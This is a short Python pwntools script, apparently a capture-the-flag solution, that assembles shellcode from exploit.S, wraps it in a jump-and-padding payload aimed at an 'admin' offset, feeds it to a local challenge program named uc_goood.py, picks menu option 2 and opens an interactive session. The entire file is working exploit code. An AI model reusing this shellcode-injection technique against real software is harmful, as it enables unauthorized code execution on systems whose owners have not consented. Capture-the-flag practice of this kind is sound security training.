import os

from pwn import *

context.arch = "amd64"

os.system("gcc -c exploit.S")

with open("exploit.o", "rb") as f:
    code = f.read()[0x40:]
    code = code[: code.find(b"\x90\x90\x90\x90\x90")]

# print("=== original ===")
# print(disasm(code))

ADMIN_OFFSET = 0x6B - 5
N = 10

payload = bytes([0xEB, ADMIN_OFFSET + N - 2])
payload += b"\x90" * (ADMIN_OFFSET - len(payload))
payload += b"\x66" * (N - 2) + b"\x89\xe5"
payload += code

with open("payload", "wb") as f:
    f.write(payload)

print("=== payload ===")
print(disasm(payload))

con = process(["python", "uc_goood.py"])

con.send(payload)
con.recvuntil("?: ")
con.send("2")

con.interactive()
